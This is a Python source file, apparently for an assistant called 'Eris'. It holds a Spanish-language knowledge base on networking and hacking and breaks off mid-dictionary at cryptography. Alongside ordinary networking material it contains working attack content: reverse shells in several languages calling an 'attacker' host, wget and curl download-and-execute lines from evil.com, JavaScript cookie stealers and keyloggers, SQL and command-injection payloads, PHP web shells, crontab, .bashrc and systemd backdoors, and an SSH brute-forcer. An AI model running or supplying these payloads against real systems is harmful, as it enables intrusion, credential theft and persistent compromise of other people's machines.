# -*- coding: utf-8 -*-
"""
Eris Cybersecurity Module – Conocimiento profundo de ciberseguridad, hacking ético,
redes, criptografía, herramientas y metodologías. Eris aprende, enseña y aplica.
"""
import json
from pathlib import Path
from datetime import datetime

DATA_DIR = Path(__file__).resolve().parent.parent / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)
PROGRESS_FILE = DATA_DIR / "cyber_progress.json"


# ═══════════════════════════════════════════════════════════════════
# KNOWLEDGE BASE
# ═══════════════════════════════════════════════════════════════════

TOPICS = {
    "networking": {
        "title": "Redes e Internet",
        "description": "Fundamentos TCP/IP, OSI, protocolos, puertos, enrutamiento, subredes.",
        "subtopics": {
            "osi_model": {
                "name": "Modelo OSI (7 capas)",
                "content": """# Modelo OSI – 7 Capas

| Capa | Nombre | Función | Protocolos/Herramientas |
|------|--------|---------|------------------------|
| 7 | Aplicación | Interfaz con el usuario | HTTP, HTTPS, FTP, SMTP, DNS, SSH, SNMP |
| 6 | Presentación | Cifrado, compresión, traducción | SSL/TLS, JPEG, ASCII, MPEG |
| 5 | Sesión | Gestión de sesiones entre aplicaciones | NetBIOS, RPC, PPTP |
| 4 | Transporte | Entrega confiable/no confiable de datos | TCP (confiable), UDP (rápido) |
| 3 | Red | Enrutamiento y addressing lógico | IP, ICMP, OSPF, BGP, ARP |
| 2 | Enlace | Direccionamiento físico, detección de errores | Ethernet, Wi-Fi (802.11), MAC, VLAN |
| 1 | Física | Transmisión de bits sobre medio físico | Cables, fibra óptica, microondas, Bluetooth |

## Flujo de datos
Cuando enviás un paquete, se encapsula desde la capa 7 hasta la 1 (con headers en cada capa). Al recibir, se desencapsula de la 1 a la 7.

## TCP vs UDP
- **TCP**: Conexión orientada a conexión. 3-way handshake (SYN → SYN-ACK → ACK). Confiable, ordenado, más lento.
- **UDP**: Sin conexión. Rápido, sin garantía de entrega. Usado en streaming, DNS, VoIP.

## Puertos importantes
- 20/21: FTP (datos/comandos)
- 22: SSH
- 23: Telnet
- 25: SMTP
- 53: DNS
- 80: HTTP
- 110: POP3
- 143: IMAP
- 443: HTTPS
- 445: SMB
- 3389: RDP
- 3306: MySQL
- 5432: PostgreSQL
- 8080: HTTP alternativo""",
                "keywords": ["OSI", "TCP", "UDP", "IP", "puertos", "protocolos", "capas"]
            },
            "tcp_ip": {
                "name": "Modelo TCP/IP",
                "content": """# Modelo TCP/IP – 4 Capas

| Capa | Equivalente OSI | Protocolos |
|------|-----------------|------------|
| Aplicación | 5, 6, 7 | HTTP, FTP, DNS, SMTP, SSH, DHCP |
| Transporte | 4 | TCP, UDP |
| Internet | 3 | IP, ICMP, ARP, IGMP |
| Acceso a Red | 1, 2 | Ethernet, Wi-Fi, PPP |

## Dirección IPv4
- Formato: 192.168.1.1 (4 octetos, 32 bits)
- Clases: A (1-126), B (128-191), C (192-223), D (multicast), E (reservado)
- Privadas: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- CIDR: Notación de subred (ej: /24 = 255.255.255.0)

## Dirección IPv6
- 128 bits, escrito en hexadecimal: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
- Ventajas: más espacio, seguridad incorporada, sin NAT

## ARP (Address Resolution Protocol)
- Resuelve IP → MAC
- Cada host mantiene una tabla ARP
- Vulnerable a ARP spoofing/poisoning

## DHCP
- Asigna IPs automáticamente
- Proceso DORA: Discover → Offer → Request → Acknowledge""",
                "keywords": ["TCP/IP", "IPv4", "IPv6", "ARP", "DHCP", "CIDR"]
            },
            "dns": {
                "name": "DNS (Domain Name System)",
                "content": """# DNS – El Directorio de Internet

## Función
Traduce nombres de dominio → IPs (y viceversa).

## Jerarquía DNS
```
. (root)
├── .com, .org, .net (TLDs)
│   ├── google.com
│   │   ├── www.google.com
│   │   ├── mail.google.com
│   │   └── docs.google.com
```

## Tipos de registros
| Registro | Función |
|----------|---------|
| A | Nombre → IPv4 |
| AAAA | Nombre → IPv6 |
| CNAME | Alias de otro nombre |
| MX | Servidor de correo |
| NS | Nameserver del dominio |
| TXT | Texto (SPF, DKIM, verificación) |
| SOA | Información de la zona |
| PTR | IP → Nombre (reverse DNS) |

## Proceso de resolución
1. PC consulta cache local
2. Si no hay, consulta Recursive Resolver (ISP)
3. Recursive consulta Root → TLD → Authoritative
4. Resultado se cachea para futuras consultas

## Ataques DNS
- **DNS Spoofing/Poisoning**: Inyectar registros falsos
- **DNS Tunneling**: Exfiltrar datos por consultas DNS
- **DNS Amplification**: Ataque DDoS usando DNS como amplificador
- **Domain Hijacking**: Cambiar el registro del dominio""",
                "keywords": ["DNS", "registros", "dominio", "resolución", "spoofing"]
            },
        },
    },
    "operating_systems": {
        "title": "Sistemas Operativos",
        "description": "Linux, Windows, comandos esenciales, administración.",
        "subtopics": {
            "linux": {
                "name": "Linux – Fundamentos",
                "content": """# Linux para Hacking

## Distribuciones principales
- **Kali Linux**: Penetration testing (200+ herramientas preinstaladas)
- **Parrot OS**: Seguridad y anonimato
- **Ubuntu**: Base general
- **Arch Linux**: Minimalista, customizable
- **CentOS/RHEL**: Servidores

## Comandos esenciales
```bash
# Navegación
ls -la          # Listar archivos (detallado + ocultos)
cd /ruta        # Cambiar directorio
pwd             # Directorio actual
find / -name "*.conf"  # Buscar archivos

# Usuarios
useradd -m usuario     # Crear usuario
passwd usuario         # Cambiar contraseña
usermod -aG sudo usuario  # Agregar a grupo sudo
id usuario             # Info del usuario

# Procesos
ps aux                 # Ver todos los procesos
top / htop             # Monitor en tiempo real
kill -9 PID            # Matar proceso
systemctl status servicio  # Estado de servicio

# Red
ifconfig / ip a        # Interfaces de red
netstat -tlnp          # Puertos abiertos
ss -tuln               # Alternativa moderna
ping host              # Probar conectividad
traceroute host        # Ruta de paquetes
nmap -sV host          # Escaneo de puertos

# Archivos
chmod 777 archivo      # Permisos (rwx para todos)
chown user:group file  # Dueño del archivo
cat archivo            # Ver contenido
grep "texto" archivo   # Buscar en archivo
nano / vim             # Editores de texto
tar -xzf archivo.tar.gz  # Extraer
wget url               # Descargar
curl url               # Hacer peticiones HTTP

# Privilegios
sudo comando           # Ejecutar como root
su - root              # Cambiar a root
```

## Archivos importantes
- /etc/passwd: Usuarios del sistema
- /etc/shadow: Contraseñas cifradas
- /etc/hosts: Mapeo local de dominios
- /etc/sudoers: Permisos de sudo
- ~/.bash_history: Historial de comandos
- /proc/: Información del kernel y procesos""",
                "keywords": ["Linux", "Kali", "comandos", "chmod", "sudo", "procesos"]
            },
            "windows": {
                "name": "Windows – Fundamentos",
                "content": """# Windows para Hacking

## PowerShell esencial
```powershell
# Procesos
Get-Process                         # Ver procesos
Get-Process | Sort-Object CPU -Desc # Por uso de CPU

# Red
Get-NetIPAddress                    # IPs
Get-NetTCPConnection                # Conexiones TCP
Test-NetConnection host -Port 80    # Probar puerto
Resolve-DnsName dominio             # Resolver DNS

# Servicios
Get-Service                         # Servicios
Get-Service -Name "W3SVC"           # Servicio específico
Start-Service nombre                # Iniciar servicio

# Usuarios
net user                            # Usuarios locales
net user usuario /add               # Crear usuario
net localgroup Administrators usuario /add  # Agregar a admins

# Archivos
Get-ChildItem -Path C:\\             # Listar archivos
Get-Content archivo.txt             # Leer archivo
Set-Content archivo.txt "texto"     # Escribir archivo

# Registry
Get-ItemProperty "HKLM:\\SOFTWARE"   # Leer registry
Set-ItemProperty ...                 # Modificar registry

# Downloads
Invoke-WebRequest url -OutFile archivo  # Descargar
```

## Active Directory (AD)
- Directorio centralizado de usuarios, equipos y políticas
- Kerberos para autenticación
- LDAP para consultas
- Group Policy Objects (GPO) para administración
- **Domain Controller**: Servidor que controla el dominio
- **DCSync**: Ataque para extraer hashes del DC

## Herramientas Windows para pentesting
- **Mimikatz**: Extraer credenciales de memoria
- **BloodHound**: Mapear AD y encontrar rutas de ataque
- **Rubeus**: Ataques Kerberos
- **PowerView**: Enumeración de AD
- **CrackMapExec**: Movimiento lateral
- **PsExec**: Ejecución remota""",
                "keywords": ["Windows", "PowerShell", "Active Directory", "Mimikatz", "BloodHound"]
            },
        },
    },
    "programming": {
        "title": "Programación para Hacking",
        "description": "Python, Bash, JavaScript, C/C++ – herramientas para automatizar.",
        "subtopics": {
            "python": {
                "name": "Python para Hacking",
                "content": """# Python – El lenguaje del hacking

## Uso en ciberseguridad
Python es el lenguaje #1 para pentesting, exploit development, automatización y análisis.

## Módulos esenciales
```python
import socket          # Conexiones de red
import requests        # Peticiones HTTP
import scapy           # Manipulación de paquetes (from scapy.all import *)
import paramiko        # SSH
import ftplib          # FTP
import smtplib         # SMTP (correo)
import sqlite3         # Bases de datos
import hashlib         # Hashing
import base64          # Codificación
import subprocess      # Ejecución de comandos
import threading       # Hilos
import os              # Sistema operativo
import sys             # Argumentos del sistema
```

## Ejemplos prácticos
```python
# Escáner de puertos básico
import socket
def scan(host, port):
    s = socket.socket()
    s.settimeout(1)
    try:
        s.connect((host, port))
        print(f"Puerto {port}: ABIERTO")
        return True
    except:
        return False
    finally:
        s.close()

# Sniffer de paquetes
from scapy.all import *
def sniff_packets():
    sniff(prn=lambda p: p.summary(), count=10)

# Brute force SSH
import paramiko
def brute_ssh(host, user, wordlist):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in open(wordlist):
        try:
            client.connect(host, username=user, password=password.strip())
            print(f"Contraseña encontrada: {password.strip()}")
            return
        except:
            pass
```

## Frameworks útiles
- **Scapy**: Manipulación y envío de paquetes
- **Requests**: Peticiones HTTP
- **BeautifulSoup**: Scraping web
- **Pwntools**: Desarrollo de exploits
- **Flask**: Crear C2 (Command & Control) simples""",
                "keywords": ["Python", "socket", "scapy", "paramiko", "exploit", "scanner"]
            },
            "bash": {
                "name": "Bash Scripting",
                "content": """# Bash – Automatización en Linux

## Scripts esenciales
```bash
#!/bin/bash
# Escáner de red
for i in {1..254}; do
    ping -c 1 192.168.1.$i | grep "64 bytes" &
done
wait

# Fuerza bruta con Hydra
hydra -l admin -P wordlist.txt ssh://target_ip

# Descarga y ejecución
wget http://evil.com/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh

# Escáner de puertos con Netcat
nc -zv target_ip 1-1000 2>&1 | grep "succeeded"

# Listener de reverse shell
nc -lvp 4444
```

## Redirección y pipes
```bash
command > file      # Redirigir salida a archivo
command >> file     # Agregar al archivo
command 2>&1        # Redirigir errores también
command | grep x    # Filtrar salida
command1 && command2 # Ejecutar segundo si primero exitoso
command1 || command2 # Ejecutar segundo si primero falla
```

## Expresiones regulares
- `^inicio`: empieza con
- `fin$`: termina con
- `.*`: cualquier carácter
- `[0-9]`: rango
- `\\d`: dígito (en grep -E)
- `-E`: extender regex""",
                "keywords": ["Bash", "script", "Hydra", "Netcat", "regex"]
            },
            "javascript": {
                "name": "JavaScript para Hacking",
                "content": """# JavaScript – Hacking Web y XSS

## XSS (Cross-Site Scripting)
```javascript
// Payload básico para XSS reflected
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

// Stealer de cookies
<script>
new Image().src="http://evil.com/steal.php?c="+document.cookie;
</script>

// Keylogger en JavaScript
document.addEventListener('keypress', function(e) {
    fetch('http://evil.com/log.php?key='+e.key);
});
```

## Node.js para herramientas
```javascript
const http = require('http');
const { exec } = require('child_process');

// Reverse shell en Node.js
const net = require('net');
const socket = new net.Socket();
socket.connect(4444, 'attacker_ip', () => {
    const proc = exec('/bin/sh');
    proc.stdout.pipe(socket);
    socket.pipe(proc.stdin);
});
```

## Browser Exploitation
- **BeEF (Browser Exploitation Framework)**: Controlar navegadores
- **Tamper Data**: Interceptar/modificar peticiones
- **Burp Suite**: Proxy para análisis de tráfico web""",
                "keywords": ["JavaScript", "XSS", "Node.js", "BeEF", "cookie", "keylogger"]
            },
        },
    },
    "databases": {
        "title": "Bases de Datos",
        "description": "SQL, MySQL, PostgreSQL, inyecciones SQL.",
        "subtopics": {
            "sql": {
                "name": "SQL Fundamentals",
                "content": """# SQL – Structured Query Language

## Comandos básicos
```sql
-- Consultas
SELECT * FROM usuarios WHERE nombre = 'admin';
SELECT nombre, email FROM usuarios WHERE activo = 1;
SELECT * FROM usuarios ORDER BY id DESC LIMIT 10;

-- Inserción
INSERT INTO usuarios (nombre, email) VALUES ('admin', 'admin@evil.com');

-- Actualización
UPDATE usuarios SET rol = 'admin' WHERE nombre = 'target';

-- Eliminación
DELETE FROM usuarios WHERE id = 1;

-- Uniones
SELECT u.nombre, p.titulo FROM usuarios u JOIN posts p ON u.id = p.user_id;

-- Subconsultas
SELECT * FROM usuarios WHERE id IN (SELECT user_id FROM posts WHERE titulo LIKE '%hack%');
```

## SQL Injection (SQLi)
```sql
-- Bypass de login
' OR '1'='1' --
' OR '1'='1' /*
admin' --

-- Union-based SQLi
' UNION SELECT username, password FROM users --

-- Blind SQLi (boolean)
' AND 1=1 -- (true)
' AND 1=2 -- (false)

-- Time-based blind
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --

-- Error-based
' AND extractvalue(1, concat(0x7e, version())) --

-- Archivo de lectura
' UNION SELECT LOAD_FILE('/etc/passwd') --

-- Escritura de archivos
' INTO OUTFILE '/var/www/html/shell.php' --
```

## Herramientas SQLi
- **SQLMap**: Automatización completa de SQLi
- **Havij**: SQLi automático
- **jSQL Injection**: GUI para SQLi
- **Burp Suite**: Manual testing""",
                "keywords": ["SQL", "SQLi", "inyección", "MySQL", "PostgreSQL", "SQLMap"]
            },
        },
    },
    "phases": {
        "title": "Fases del Hacking Ético",
        "description": "Metodología del pentesting: reconocimiento → explotación → post-explotación.",
        "subtopics": {
            "reconnaissance": {
                "name": "Fase 1: Reconocimiento (OSINT)",
                "content": """# Reconocimiento – Recopilación de Inteligencia

## Reconocimiento Pasivo (sin contacto directo)
- **Google Dorking**: site:target.com filetype:pdf, inurl:admin, intitle:"index of"
- **WHOIS**: Información de registro de dominios
- **DNS Enumeration**: dnsenum, dig, host, nslookup
- **Shodan**: IoT, servicios expuestos en internet
- **Censys**: Escaneo de internet completo
- **Maltego**: Análisis de relaciones y patrones
- **theHarvester**: Emails, subdominios, IPs
- **Recon-ng**: Framework de reconocimiento
- **SpiderFoot**: OSINT automatizado
- **Wayback Machine**: Versiones históricas de sitios

## Reconocimiento Activo (contacto directo)
- **Ping Sweep**: Descubrir hosts activos (nmap -sn)
- **Port Scanning**: nmap -sS -sV -O target
- **Service Enumeration**: Identificar versiones exactas
- **OS Fingerprinting**: nmap -O, p0f
- **Banner Grabbing**: netcat, nmap

## Recursos OSINT
- **Redes sociales**: LinkedIn, Twitter, Instagram
- **Archivos públicos**: Registros judiciales, prensa
- **Metadata**: exiftool (fotos), pdfinfo (PDFs)
- **GitLeaks**: Código fuente filtrado
- **Pastebin**: Información filtrada""",
                "keywords": ["OSINT", "reconocimiento", "Shodan", "Maltego", "Google dorking"]
            },
            "scanning": {
                "name": "Fase 2: Escaneo y Enumeración",
                "content": """# Escaneo y Enumeración

## Nmap – El estándar
```bash
nmap -sT target          # TCP connect scan
nmap -sS target          # SYN stealth scan
nmap -sU target          # UDP scan
nmap -sV target          # Detectar versiones
nmap -O target           # Detectar SO
nmap -A target           # Agresivo (OS + version + scripts)
nmap -p- target          # Todos los puertos (1-65535)
nmap -sC target          # Scripts por defecto
nmap --script vuln target # Scripts de vulnerabilidades
nmap -oN output.txt target # Guardar resultados
```

## Enumeración de servicios
- **SMB**: smbclient -L //target, enum4linux
- **SNMP**: snmpwalk, snmp-check
- **FTP**: ftp anonymous@target
- **LDAP**: ldapsearch -x -h target
- **SSH**: ssh -v target
- **HTTP**: nikto, dirb, gobuster
- **SMTP**: smtp-user-enum

## Dirbusting (descubrir directorios)
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
dirb http://target /usr/share/wordlists/dirb/common.txt
wfuzz -c -z file,wordlist http://target/FUZZ
```

## Vulnerability Scanners
- **Nessus**: Escáner profesional completo
- **OpenVAS**: Alternativa open source
- **Nikto**: Web server scanner
- **WPScan**: WordPress scanner""",
                "keywords": ["Nmap", "escaneo", "enum4linux", "gobuster", "Nessus"]
            },
            "exploitation": {
                "name": "Fase 3: Explotación",
                "content": """# Explotación – Gaining Access

## Metasploit Framework
```bash
msfconsole
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

## Tipos de exploits
- **Buffer Overflow**: Escribir más datos de los que el buffer puede manejar
- **Return-to-libc**: Usar funciones de libc en lugar de código del usuario
- **ROP (Return-Oriented Programming)**: Encadenar gadgets existentes
- **Shellcode**: Código máquina que ejecuta una shell
- **Heap Overflow**: Overflow en el heap
- **Use-After-Free**: Reutilizar memoria liberada
- **Format String**: Manipular strings de formato

## Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/attacker/4444 0>&1

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# Netcat
nc -e /bin/sh attacker 4444

# PHP
php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Bind Shells
```bash
# El target escucha, tú te conectas
nc target 4444
```

## Herramientas de explotación
- **Metasploit**: Framework completo
- **Exploit-DB**: Base de datos de exploits
- **SearchSploit**: Búsqueda offline de Exploit-DB
- **BeEF**: Browser exploitation
- **SET (Social Engineering Toolkit)**: Ingeniería social""",
                "keywords": ["exploit", "Metasploit", "reverse shell", "shellcode", "buffer overflow"]
            },
            "post_exploitation": {
                "name": "Fase 4: Post-Explotación",
                "content": """# Post-Explotación – Mantener el Control

## Meterpreter (Metasploit)
```bash
sysinfo                    # Info del sistema
getuid                     # Usuario actual
getsystem                  # Escalada de privilegios
hashdump                   # Dump de hashes
download archivo /local    # Descargar archivos
upload /local archivo      # Subir archivos
shell                      # Shell del sistema
keyscan_start              # Keylogger
screenshot                 # Captura de pantalla
portfwd add 3389 127.0.0.1 3389  # Port forwarding
```

## Escalada de Privilegios
### Linux
- **SUID binaries**: find / -perm -4000 2>/dev/null
- **Sudo vulnerabilities**: sudo -l → GTFOBins
- **Kernel exploits**: linux-exploit-suggester
- **Cron jobs**: cat /etc/crontab
- **Capabilities**: getcap -r / 2>/dev/null
- **Writable /etc/passwd**: echo 'root2:HASH:0:0::/root:/bin/bash' >> /etc/passwd

### Windows
- **Token Impersonation**: Incognito en Meterpreter
- **Unquoted Service Paths**: sc qc service_name
- **DLL Hijacking**: Reemplazar DLLs del sistema
- **AlwaysInstallElevated**: Reg keys → MSI como SYSTEM
- **PrintSpoofer / Potato**: Windows privilege escalation

## Persistencia
### Linux
```bash
# Crontab
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | crontab -

# Systemd service
echo '[Unit]\nDescription=Updater\n[Service]\nExecStart=/tmp/.backdoor\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/updater.service

# .bashrc
echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/attacker/4444 0>&1 &"' >> ~/.bashrc
```

### Windows
- **Registry Run Keys**: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- **Scheduled Tasks**: schtasks /create /tn "Updater" /tr "C:\\backdoor.exe" /sc onstart
- **Service Installation**: sc create Backdoor binPath="C:\\backdoor.exe" start=auto

## Movimiento Lateral
- **Pass-the-Hash**: Usar hash NTLM sin contraseña
- **Pass-the-Ticket**: Kerberos tickets
- **PsExec**: Ejecución remota
- **WinRM/PowerShell Remoting**: Conexión remota
- **SSH Tunneling**: Túneles SSH
- **RDP**: Escritorio remoto
- **SMB**: Compartición de archivos""",
                "keywords": ["post-explotación", "escalada", "persistencia", "movimiento lateral", "Meterpreter"]
            },
        },
    },
    "web_hacking": {
        "title": "Hacking Web (OWASP Top 10)",
        "description": "Vulnerabilidades web: SQLi, XSS, CSRF, SSRF, XXE, y más.",
        "subtopics": {
            "owasp_top10": {
                "name": "OWASP Top 10 (2021)",
                "content": """# OWASP Top 10 – Las 10 Peores Vulnerabilidades Web

| # | Vulnerabilidad | Descripción |
|---|---------------|-------------|
| A01 | Broken Access Control | Acceso no autorizado a recursos |
| A02 | Cryptographic Failures | Fallos en cifrado/datos sensibles |
| A03 | Injection | SQLi, XSS, OS Command Injection |
| A04 | Insecure Design | Diseño sin seguridad |
| A05 | Security Misconfiguration | Configuraciones por defecto |
| A06 | Vulnerable Components | Componentes con CVEs conocidos |
| A07 | Auth Failures | Autenticación débil (brute force) |
| A08 | Data Integrity Failures | Fallos de integridad de datos |
| A09 | Logging Failures | Falta de logs/monitoreo |
| A10 | SSRF | Server-Side Request Forgery |

## Detalle de cada una

### A01: Broken Access Control
- IDOR (Insecure Direct Object Reference): /api/users/1 → /api/users/2
- Privilege escalation: Cambiar role=user en el request
- Missing function level access: Acceder a admin sin ser admin

### A03: Injection
- SQL Injection
- XSS (Cross-Site Scripting): Reflected, Stored, DOM-based
- Command Injection: ; whoami, `id`, $(whoami)
- LDAP Injection
- XPath Injection
- Template Injection (SSTI): {{7*7}} → 49

### A07: Authentication Failures
- Brute force (HJohn, Hydra, Burp Intruder)
- Credential stuffing (bases filtradas)
- Session fixation
- Missing MFA""",
                "keywords": ["OWASP", "injection", "XSS", "CSRF", "access control"]
            },
            "xss": {
                "name": "Cross-Site Scripting (XSS) Detallado",
                "content": """# XSS – Cross-Site Scripting

## Tipos de XSS
| Tipo | Descripción | Persistencia |
|------|-------------|--------------|
| Reflected | El payload viene en la URL/respuesta | No persistente |
| Stored | El payload se guarda en BD/servidor | Persistente |
| DOM-based | El payload se procesa en el cliente | No persistente |

## Payloads comunes
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
"><script>alert('XSS')</script>
' onmouseover='alert("XSS")
```

## Evasión de filtros
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<svg/onload=alert('XSS')>
<script>fetch('http://evil.com/?c='+document.cookie)</script>
```

## Cookie Stealing
```javascript
// Robar cookie
new Image().src="http://evil.com/steal.php?cookie="+document.cookie;

// Robar cookie con fetch
fetch('http://evil.com/steal?c='+document.cookie);

// Robar localStorage
fetch('http://evil.com/steal?d='+JSON.stringify(localStorage));

// Keylogger
document.onkeypress=function(e){fetch('http://evil.com/log?key='+e.key)};
```

## Prevención
- Content Security Policy (CSP)
- HttpOnly cookies
- Sanitización de input
- Encoding de output""",
                "keywords": ["XSS", "cookie stealing", "stored XSS", "reflected XSS", "DOM XSS"]
            },
            "command_injection": {
                "name": "Command Injection",
                "content": """# Command Injection – Ejecución de comandos del sistema

## Payloads
```bash
; whoami
| whoami
`whoami`
$(whoami)
; cat /etc/passwd
| cat /etc/passwd
; curl http://evil.com/shell.sh | bash
; wget http://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
```

## Blind Command Injection
```bash
; ping -c 3 attacker.com    # OOB
; curl http://evil.com/$(whoami)  # OOB
```

## Bypass de filtros
```bash
b'wh'+'oami'  # Python
c'a't /etc'/'p'ass'wd  # Concatenación
${IFS}  # Internal Field Separator
```

## Web Shells
```php
<?php echo shell_exec($_GET['cmd']); ?>
<?php system($_REQUEST['cmd']); ?>
```

## Prevención
- Nunca pasar input del usuario a comandos del sistema
- Usar APIs en lugar de comandos
- Input validation estricta""",
                "keywords": ["command injection", "shell", "web shell", "RCE"]
            },
        },
    },
    "network_hacking": {
        "title": "Hacking de Redes",
        "description": "MITM, DNS poisoning, ataques WiFi, sniffing.",
        "subtopics": {
            "mitm": {
                "name": "Man-in-the-Middle (MITM)",
                "content": """# Man-in-the-Middle (MITM)

## Tipos de MITM
1. **ARP Spoofing**: Envenenar tabla ARP para redirigir tráfico
2. **DNS Spoofing**: Redirigir resolución DNS
3. **SSL Stripping**: Degradar HTTPS a HTTP
4. **WiFi Evil Twin**: AP falso que imita al legítimo
5. **Session Hijacking**: Robar tokens de sesión

## Herramientas
- **Bettercap**: Framework MITM completo
- **mitmproxy**: Proxy transparente para análisis
- **Ettercap**: Sniffer y MITM
- **Responder**: Capturar hashes NTLM
- **Wireshark**: Análisis de tráfico (no es/MITM pero útil)

## Bettercap ejemplo
```bash
bettercap -iface wlan0
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

## SSL Stripping
- atktool mitmproxy
- sslstrip.py
- HSTS bypass con hsts-stripper

## Prevención
- HTTPS Everywhere (HSTS)
- Certificate Pinning
- VPN en redes públicas
- Verificar certificados""",
                "keywords": ["MITM", "ARP spoofing", "Bettercap", "mitmproxy", "SSL stripping"]
            },
            "wifi_hacking": {
                "name": "Hacking de Redes WiFi",
                "content": """# Hacking WiFi

## Tipos de cifrado
| Cifrado | Seguridad | Estado |
|---------|-----------|--------|
| WEP | Muy débil | Obsoleto |
| WPA | Débil | Vulnerable a TKIP |
| WPA2 | Aceptable | Vulnerable a KRACK |
| WPA3 | Seguro | Actualmente el estándar |

## Ataques WPA2
1. **Handshake capture**: airodump-ng captura el 4-way handshake
2. **Deauth attack**: Desautenticar clientes para forzar reconexión
3. **Dictionary attack**: Aircrack-ng con wordlist
4. **PMKID attack**: Sin necesidad de clientes conectados

## Herramientas
- **aircrack-ng suite**: Suite completa
  - airmon-ng: Modo monitor
  - airodump-ng: Captura tráfico
  - aireplay-ng: Inyección de paquetes
  - aircrack-ng: Crackear WPA/WEP
- **Hashcat**: GPU cracking (modo 22000 para WPA-PBKDF2-PMKID+EAPOL)
- **Fern Wifi Cracker**: GUI
- **Wifite2**: Automatización

## Proceso WPA2
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid MAC_AP -w capture wlan0mon
aireplay-ng --deauth 5 -a MAC_AP wlan0mon
aircrack-ng -w wordlist.txt capture-01.cap
```

## Evil Twin
```bash
airbase-ng -e "Free_WiFi" -c 6 wlan0mon
hostapd crear_ap.conf
```

## Prevención
- WPA3
- Contraseñas fuertes (20+ caracteres)
- Desactivar WPS
- MAC filtering (débil pero ayuda)
- 802.1X/EAP""",
                "keywords": ["WiFi", "WPA2", "aircrack", "handshake", "evil twin"]
            },
        },
    },
    "active_directory": {
        "title": "Hacking de Active Directory",
        "description": "Entornos corporativos Windows, movimientos laterales, dominios.",
        "subtopics": {
            "ad_attacks": {
                "name": "Ataques a Active Directory",
                "content": """# Active Directory Hacking

## Enumeración
```bash
# BloodHound - Mapear AD
bloodhound-python -u user -p pass -d domain.com -c All

# PowerView
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer

# ldapsearch
ldapsearch -x -h dc.domain.com -b "DC=domain,DC=com"
```

## Ataques comunes
| Ataque | Descripción | Herramienta |
|--------|-------------|-------------|
| Kerberoasting | Crackear TGS de servicio | Rubeus, Impacket |
| AS-REP Roasting | Usuarios sin preauth | Rubeus |
| Pass-the-Hash | Usar hash NTLM | CrackMapExec, Impacket |
| Pass-the-Ticket | Usar Kerberos ticket | Rubeus |
| DCSync | Extraer hashes del DC | Mimikatz, Impacket |
| Golden Ticket | Ticket Kerberos forjado | Mimikatz |
| Silver Ticket | Ticket de servicio forjado | Mimikatz |
| Zerologon | Vulnerabilidad CVE-2020-1472 | exploits |
| NTLM Relay | Relay de autenticación | Impacket, ntlmrelayx |

## Movimiento lateral
```bash
# PsExec
psexec.py domain/user:pass@target

# WinRM
evil-winrm -i target -u user -p pass

# WMI
wmiexec.py domain/user:pass@target

# CrackMapExec
crackmapexec smb target -u user -p pass --sam
crackmapexec smb target -u user -p pass -M lsassy
```

## Exfiltración
- **Mimikatz**: lsass.exe dumping
- **LaZagne**: Credenciales almacenadas
- **SharpDPAPI**: Credenciales DPAPI
- **Reg save**: SAM y SYSTEM hives""",
                "keywords": ["Active Directory", "Kerberos", "Mimikatz", "BloodHound", "DCSync"]
            },
        },
    },
    "social_engineering": {
        "title": "Ingeniería Social",
        "description": "Phishing, smishing, vishing, manipulación psicológica.",
        "subtopics": {
            "phishing": {
                "name": "Phishing y Derivados",
                "content": """# Ingeniería Social

## Tipos
| Tipo | Medio | Ejemplo |
|------|-------|---------|
| Phishing | Email | Email falso de banco |
| Smishing | SMS | "Su paquete tiene problemas, haga clic aquí" |
| Vishing | Teléfono | Llamada suplantando soporte técnico |
| Spear Phishing | Email dirigido | Email personalizado a un objetivo |
| Whaling | Email ejecutivo | Ataque a CEO/CFO |
| Clone Phishing | Email clonado | Reenviar email legítimo con adjunto malicioso |

## SET (Social Engineering Toolkit)
```bash
setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack
4) Site Cloner
# Ingresa URL legítima a clonar
# El victim abre la página clonada y pone sus credenciales
```

## Phishing payloads
- **BeEF**: Browser exploitation framework
- **GoPhish**: Plataforma de phishing corporativo
- **King Phisher**: Campañas de phishing
- **SET**: Generador de credenciales

## Red flags para detectar
- Urgencia ("Haga clic ahora o su cuenta será bloqueada")
- Errores ortográficos
- Remitente sospechoso
- Links acortados
- Solicitudes de información sensible""",
                "keywords": ["phishing", "social engineering", "SET", "GoPhish", "vishing"]
            },
        },
    },
    "cryptography": {
        "title": "Criptografía",
        "description": "Cifrado, hashing, análisis de contraseñas.",
        "subtopics": {
            "crypto_fundamentals": {
